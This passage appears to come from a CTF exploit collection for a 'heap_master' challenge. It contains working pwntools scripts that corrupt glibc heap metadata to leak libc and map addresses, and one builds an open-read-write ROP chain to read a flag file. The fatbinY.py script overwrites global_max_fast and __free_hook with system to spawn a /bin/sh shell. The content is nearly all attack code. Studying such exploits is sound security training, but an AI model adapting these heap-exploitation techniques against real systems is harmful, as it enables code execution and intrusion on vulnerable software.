    Edit(offset+8,p64(0x1120))
    Edit(offset+0x1120+8,p64(0x21))
    Edit(offset+0x1120+0x20+8,p64(0x21))


    Delete(offset+0x10)
    #
    p_rdi = libc_base + 0x0000000000021102
    p_rdx_rsi = libc_base + 0x00000000001150c9
    p_rax = libc_base + 0x0000000000033544
    syscall = libc_base + 0x00000000000bc375
    Edit(0x400,'./flag\x00\x00')
    #
    orw = [
            p_rdi,map_addr+0x400,
            p_rdx_rsi,0,0,
            p_rax,2,
            syscall,
            p_rdi,3,
            p_rdx_rsi,0x30,map_addr+0x100,
            p_rax,0,
            syscall,
            p_rdi,1,
            p_rdx_rsi,0x30,map_addr+0x100,
            p_rax,1,
            syscall
    ]
    Edit(offset,flat(orw))
    gdb.attach(p)

    Exit()
    p.interactive()

exp()
```

### fatbinY.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1

libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK):
        log.failure("Invalid path {} to ld".format(ld))
        return None


    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK):
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)


    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\x00'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK):
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path))
    return ELF(path)

if debug == 1:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    stdout_addr = 0x2620
    elf = ELF('./heap_master')
    p = process('./heap_master')

elif debug == 2:
    libc = ELF('./libc.so.6')
    stdout_addr = 0x5600
    elf = change_ld("./heap_master",'./ld-linux-x86-64.so.2')
    p = elf.process(env={"LD_PRELOAD":"./libc.so.6"})

def Add(size):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))

def Edit(offset,content):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil("offset: ")
    p.sendline(str(offset))

    p.recvuntil("size: ")
    p.sendline(str(len(content)))

    p.recvuntil("content: ")
    p.send(content)

def Delete(offset):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil("offset: ")
    p.sendline(str(offset))

def Exit():
    p.recvuntil('>> ')
    p.sendline('4')

def exp():
    offset = 0x8800-0x7a0
    #leak libc
    Edit(offset+0,p64(0)+p64(0x331))#0
    Edit(offset+0x330,p64(0)+p64(0x31))#1
    Edit(offset+0x330+0x30,p64(0)+p64(0x411))#2
    Edit(offset+0x330+0x30+0x410,p64(0)+p64(0x31))#3
    Edit(offset+0x330+0x30+0x410+0x30,p64(0)+p64(0x411))#4
    Edit(offset+0x330+0x30+0x410+0x30+0x410,p64(0)+p64(0x31))#5
    Edit(offset+0x330+0x30+0x410+0x30+0x410+0x30,p64(0)+p64(0x31))#6

    Delete(offset+0x10)#0
    Delete(offset+0x330+0x30+0x10)#2
    Add(0x90)

    #set two main_arena addr
    Edit(offset+0x330+0x30,p64(0)+p64(0x111)+p64(0)+p64(0x101))
    Edit(offset+0x330+0x30+0x110,p64(0)+p64(0x101))
    Edit(offset+0x330+0x30+0x110+0x100,p64(0)+p64(0x101))


    Delete(offset+0x330+0x30+0x10+0x10)
    Add(0x90)
    Edit(offset+0x330+0x30+0x110,p64(0)+p64(0x101))

    Delete(offset+0x330+0x30+0x10)
    Add(0x90)

    #recover
    #Edit(0x330+0x30,p64(0)+p64(0x411))#2 again

    Edit(offset+0x330+0x30+0x3f0,p64(0x3f0)+p64(0x20)+p64(0)*2+p64(0)+p64(0x31))

    #
    Edit(offset+0x330+0x30+0x8,p64(0x3f1)+p64(0)+p16(stdout_addr-0x10))
    Edit(offset+0x330+0x30+0x18+0x8,p64(0)+p16(stdout_addr+0x19-0x20))
    Delete(offset+0x330+0x30+0x410+0x30+0x10)#4


    Add(0x90)
    if debug == 1:
        p.recvn(0x18)
        libc_base = u64(p.recv(8)) - (0x7ffff7dd06e0 - 0x7ffff7a0d000)
        #map
        map_addr = u64(p.recv(8)) - (0xc13b1800-0xc13a9000)
    else:
        map_addr = u64(p.recv(8))
        libc_base = u64(p.recv(8)) - (0x7ffff7dd5683-0x7ffff7a37000)

    log.success("libc base => " + hex(libc_base))
    log.success("map addr => " + hex(map_addr))
    #get shell
    #large bin attack change free_hook to map_addr
    #also can be implemented by just free
    offset = 0
    Edit(offset+0,p64(0)+p64(0x331))#0
    Edit(offset+0x330,p64(0)+p64(0x31))#1
    Edit(offset+0x330+0x30,p64(0)+p64(0x511))#2
    Edit(offset+0x330+0x30+0x510,p64(0)+p64(0x31))#3
    Edit(offset+0x330+0x30+0x510+0x30,p64(0)+p64(0x511))#4
    Edit(offset+0x330+0x30+0x510+0x30+0x510,p64(0)+p64(0x31))#5
    Edit(offset+0x330+0x30+0x510+0x30+0x510+0x30,p64(0)+p64(0x31))#6
    libc.address =  libc_base
    io_list_all = libc.sym['__free_hook']

    Delete(offset+0x10)#0
    Delete(offset+0x330+0x30+0x10)#2
    Add(0x90)

    Delete(offset+0x330+0x30+0x510+0x30+0x10)#4

    Edit(offset+0x330+0x30,p64(0)+p64(0x3f1)+p64(0)+p64(io_list_all-0x10)+p64(0)+p64(io_list_all-0x20))
    Edit(offset+0x330+0x30+0x3f0,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
    io_heap_addr = map_addr + offset + 0x8a0

    Add(0x90)
    #ub to change global max fast
    Edit(0x82e0+0x18,p64(libc_base+(0x7ffff7dd37f8-0x7ffff7a0d000)-0x10))
    Add(0xa0)
    #

    #calc size
    main_arena = libc.sym['__malloc_hook']+0x10
    idx = (libc.sym['__free_hook']-(main_arena+8))/8
    size = idx*0x10 + 0x20

    Edit(0x8a0,p64(0)+p64(size+1)+p64(libc.sym['system']))
    Edit(0x8a0+size,p64(0)+p64(0x21)+"/bin/sh\x00")
    Edit(0x8a0+size+0x20,p64(0)+p64(0x21))
    #gdb.attach(p)

    Add(size-0x10)
    Delete(0x8a0+size+0x10)


    p.interactive()

exp()
```
